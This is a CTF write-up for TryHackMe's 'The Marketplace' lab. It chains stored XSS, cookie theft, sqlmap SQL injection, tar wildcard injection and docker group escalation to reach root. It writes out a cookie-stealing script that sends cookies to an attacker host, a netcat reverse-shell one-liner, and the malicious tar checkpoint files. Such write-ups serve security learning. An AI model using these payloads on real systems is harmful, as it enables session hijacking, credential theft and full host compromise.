@@ -1,0 +1,195 @@
+===========================================================
+       CTF WRITE-UP: The Marketplace — TryHackMe
+===========================================================
+Platform : TryHackMe
+Machine  : The Marketplace
+Difficulty: Medium
+Tags     : XSS, Cookie Stealing, SQLi, Tar Wildcard, Docker
+===========================================================
+
+
+-----------------------------------------------------------
+INTRODUCTION
+-----------------------------------------------------------
+
+The Marketplace is a medium-level box that puts four significant web
+security concepts into a single chain: stored XSS, cookie theft, SQL
+injection, and Docker-based privilege escalation. Each layer builds on
+the last in a way that feels like a real-world attack scenario more
+than a CTF puzzle. Highly recommended for anyone studying web security.
+
+
+-----------------------------------------------------------
+STEP 1 — RECONNAISSANCE (NMAP)
+-----------------------------------------------------------
+
+Full port scan first:
+
+    nmap -sC -sV -p- -oN nmap_scan.txt <target-ip>
+
+Three open ports:
+
+  - Port 22    : SSH
+  - Port 80    : HTTP (Nginx)
+  - Port 32768 : HTTP (Node.js)
+
+Port 80 was the main target. The robots.txt file, flagged in the scan
+results, had one disallowed entry: /admin. The Node.js server on 32768
+appeared to mirror the main site.
+
+
+-----------------------------------------------------------
+STEP 2 — WEB APPLICATION ENUMERATION & STORED XSS
+-----------------------------------------------------------
+
+Browsing to port 80 revealed a simple online marketplace. I created an
+account, logged in, and started exploring. There was a feature to create
+new listings with a title and description, and another to report listings
+to the admins.
+
+Testing the description field for XSS:
+
+    <script>alert(1)</script>
+
+The alert popped when viewing the listing. Stored XSS — the script was
+being written to the database and executing for anyone who viewed the
+page. More importantly, the site set session cookies on login. If we
+could get the admin to view a malicious listing, we could steal their
+cookie.
+
+
+-----------------------------------------------------------
+STEP 3 — STEALING THE ADMIN COOKIE
+-----------------------------------------------------------
+
+I started an HTTP server on my attack machine to capture incoming
+requests, then crafted a cookie-stealing payload in the listing
+description:
+
+    <script>
+    document.location='http://<your-ip>:8000/steal?c='+document.cookie
+    </script>
+
+Created the listing, then reported it to the admins using the reporting
+feature. The admin viewed the listing and my HTTP server caught the
+incoming request carrying their session cookie.
+
+Replaced my own cookie with the stolen admin cookie in the browser
+(Firefox Storage Inspector works perfectly for this), refreshed the
+page, and found myself logged in as admin.
+
+The admin panel displayed all users and the first flag.
+
+
+-----------------------------------------------------------
+STEP 4 — SQL INJECTION (ADMIN PANEL)
+-----------------------------------------------------------
+
+The admin panel URL changed to /admin?user=2 when viewing a user. That
+integer parameter looked injectable. Testing with a single quote:
+
+    /admin?user=2'
+
+Produced a database error — SQL injection confirmed.
+
+I used sqlmap to extract the full database (needed a delay flag to work
+around potential anti-CSRF measures):
+
+    sqlmap "http://<target-ip>/admin?user=2" --cookie="token=<admin-cookie>" --technique=U --delay=2 --dump
+
+sqlmap dumped three tables. The usernames and password hashes were there
+but cracking them turned out to be a dead end. What actually mattered
+was the messages table — inside it was a message to user Jake (user 3)
+informing him that his SSH password had been reset to a temporary value,
+with the new password included in the message.
+
+SSH credentials extracted. Time to get in.
+
+
+-----------------------------------------------------------
+STEP 5 — SSH AS JAKE
+-----------------------------------------------------------
+
+    ssh jake@<target-ip>
+
+Grabbed the user flag from his home directory:
+
+    cat /home/jake/user.txt
+
+    FLAG: [user flag here]
+
+Michael's home directory was also visible. That would matter shortly.
+
+
+-----------------------------------------------------------
+STEP 6 — PIVOTING TO MICHAEL (TAR WILDCARD INJECTION)
+-----------------------------------------------------------
+
+    sudo -l
+
+Jake could run /opt/backups/backup.sh as the user michael without a
+password. Looking at the script:
+
+    tar cf /opt/backups/backup.tar *
+
+It used tar with a wildcard. A well-known technique: tar processes
+checkpoint arguments if files with those names exist in the directory.
+We can abuse this to execute arbitrary commands.
+
+Generated a reverse shell payload with msfvenom:
+
+    msfvenom -p cmd/unix/reverse_netcat lhost=<your-ip> lport=4444 R
+
+Created the necessary files in /opt/backups/:
+
+    echo "mkfifo /tmp/uvity; nc <your-ip> 4444 0</tmp/uvity | /bin/sh >/tmp/uvity 2>&1; rm /tmp/uvity" > shell.sh
+    echo "" > "--checkpoint-action=exec=sh shell.sh"
+    echo "" > --checkpoint=1
+
+Set up a Netcat listener, then ran the script as Michael:
+
+    sudo -u michael /opt/backups/backup.sh
+
+Michael's shell connected back.
+
+
+-----------------------------------------------------------
+STEP 7 — PRIVILEGE ESCALATION TO ROOT (DOCKER)
+-----------------------------------------------------------
+
+Michael turned out to be a member of the docker group. Listing running
+containers confirmed the Alpine image was available.
+
+GTFOBins has the docker escalation right there:
+
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+That mounts the entire host filesystem into the container and drops us
+into a root shell with access to everything.
+
+    whoami
+    root
+
+    cat /root/root.txt
+
+    FLAG: [root flag here]
+
+
+-----------------------------------------------------------
+SUMMARY & TAKEAWAYS
+-----------------------------------------------------------
+
+Four distinct steps, each building on the last:
+
+  1. Stored XSS in listing description to steal the admin's cookie.
+  2. SQLi on the admin panel to extract SSH credentials from messages.
+  3. Tar wildcard injection to pivot from jake to michael.
+  4. Docker group membership for a trivial root escalation.
+
+The Marketplace is a great reminder of how chaining smaller, contained
+vulnerabilities can lead to full system compromise. No single step was
+devastating alone — together, they were devastating.
+
+===========================================================
+                     END OF WRITE-UP
+===========================================================
